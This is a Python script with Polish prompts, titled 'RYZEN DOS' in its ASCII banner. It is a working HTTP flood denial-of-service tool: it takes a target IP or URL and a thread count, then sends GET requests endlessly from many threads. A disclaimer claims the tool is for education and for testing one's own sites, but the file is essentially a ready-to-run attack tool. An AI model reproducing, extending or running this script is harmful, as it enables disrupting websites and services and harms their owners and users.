import requests
import threading
import os

wersja = "1.2"

os.system("cls" if os.name == "nt" else "clear")

ascii_art = f'''\033[31m
      :::::::::  :::   ::: ::::::::: :::::::::: ::::    :::          :::::::::   ::::::::   :::::::: 
     :+:    :+: :+:   :+:      :+:  :+:        :+:+:   :+:          :+:    :+: :+:    :+: :+:    :+: 
    +:+    +:+  +:+ +:+      +:+   +:+        :+:+:+  +:+          +:+    +:+ +:+    +:+ +:+         
   +#++:++#:    +#++:      +#+    +#++:++#   +#+ +:+ +#+          +#+    +:+ +#+    +:+ +#++:++#++   
  +#+    +#+    +#+      +#+     +#+        +#+  +#+#+#          +#+    +#+ +#+    +#+        +#+    
 #+#    #+#    #+#     #+#      #+#        #+#   #+#+#          #+#    #+# #+#    #+# #+#    #+#     
###    ###    ###    ######### ########## ###    ####          #########   ########   ########       \033[0m
'''

print(f'''{ascii_art} \033[36m
                                            Stworzone przez nowak122 v{wersja}
            UWAGA: Autor programu nie ponosi odpowiedzialności za jakiekolwiek szkody wynikłe z jego używania.
            Ten program jest przeznaczony wyłącznie do celów edukacyjnych i testowania własnych projektów.
            Nie używaj go do atakowania stron internetowych ani innych systemów bez zgody właściciela. \033[0m
\033[35m            
Wybierz opcje:
1 - Adres IP
2 - Adres URL \033[0m
''')
import requests
import threading

wyboradresu = int(input(">>  "))

def pobierz_adres():
    if wyboradresu == 1:
        adres = input("\033[32mWprowadź adres IP (np. 192.168.0.10):\033[0m ")
        return f"http://{adres}"
    elif wyboradresu == 2:
        return input("\033[32mWprowadź URL:\033[0m ")
    else:
        print("Niepoprawny wybór.")
        exit()

def url():
    target = pobierz_adres()
    ilosc = int(input("\033[32mIle zapytań na serię?\033[0m "))
    watek_ilosc = int(input("\033[32mIle wątków?\033[0m "))

    def wysylanie_zapytan(start_index):
        i = start_index
        while True:
            for _ in range(ilosc):
                try:
                    response = requests.get(target, timeout=5)
                    print(f"Zapytanie {i}: {response.status_code}")
                except requests.RequestException as e:
                    print(f"Błąd przy zapytaniu {i}: {e}")
                i += 1

    watki = []
    for w in range(watek_ilosc):
        watek = threading.Thread(target=wysylanie_zapytan, args=(w * ilosc + 1,))
        watek.start()
        watki.append(watek)


url()
